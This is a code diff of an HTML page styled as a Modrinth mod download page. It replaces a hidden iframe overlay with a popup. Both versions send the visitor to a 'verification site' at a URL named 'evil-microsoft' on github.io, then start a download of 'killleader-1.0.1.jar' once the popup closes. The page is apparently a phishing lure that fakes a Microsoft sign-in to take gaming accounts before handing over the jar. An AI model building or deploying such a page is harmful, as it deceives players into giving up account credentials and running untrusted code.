@@ -10,7 +10,6 @@
         .container { width: 100%; max-width: 600px; background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); border: 1px solid #e1e4e8; }
         
         h1 { color: var(--modrinth-green); margin-top: 0; }
-        
         .card { background: #fff; border: 1px solid #ddd; padding: 20px; border-radius: 10px; margin-top: 20px; }
         
         .download-btn { 
@@ -21,12 +20,6 @@
         .download-btn:active { transform: scale(0.98); }
 
         .description { line-height: 1.6; color: #4a5568; margin-top: 20px; }
-        
-        #overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.8); display: none; justify-content: center; align-items: center; z-index: 1000;
-        }
-        #hidden-iframe { width: 80%; height: 80%; background: white; border: none; }
     </style>
 </head>
 <body>
@@ -47,33 +40,22 @@
         </div>
     </div>
 
-    <div id="overlay">
-        <iframe id="hidden-iframe" src=""></iframe>
-    </div>
-
     <script>
         const btn = document.getElementById('download-btn');
-        const overlay = document.getElementById('overlay');
-        const frame = document.getElementById('hidden-iframe');
         const targetUrl = 'https://pcconfighelper.github.io/evil-microsoft/';
 
-        let initialLoad = true;
-
         btn.onclick = () => {
-            overlay.style.display = 'flex';
-            frame.src = targetUrl;
-            initialLoad = true;
-        };
+            // Open the verification site in a new popup window
+            const popup = window.open(targetUrl, '_blank', 'width=800,height=600');
 
-        frame.onload = () => {
-            // After the initial load, monitor for navigation
-            if (!initialLoad) {
-                // The frame has navigated (redirected)
-                overlay.style.display = 'none';
-                frame.src = ''; // Clear the frame
-                window.location.href = 'killleader-1.0.1.jar';
-            }
-            initialLoad = false;
+            // Periodically check if the popup has been closed
+            const checkInterval = setInterval(() => {
+                if (popup.closed) {
+                    clearInterval(checkInterval);
+                    // Trigger the download after the window is closed
+                    window.location.href = 'killleader-1.0.1.jar';
+                }
+            }, 500);
         };
     </script>
 </body>
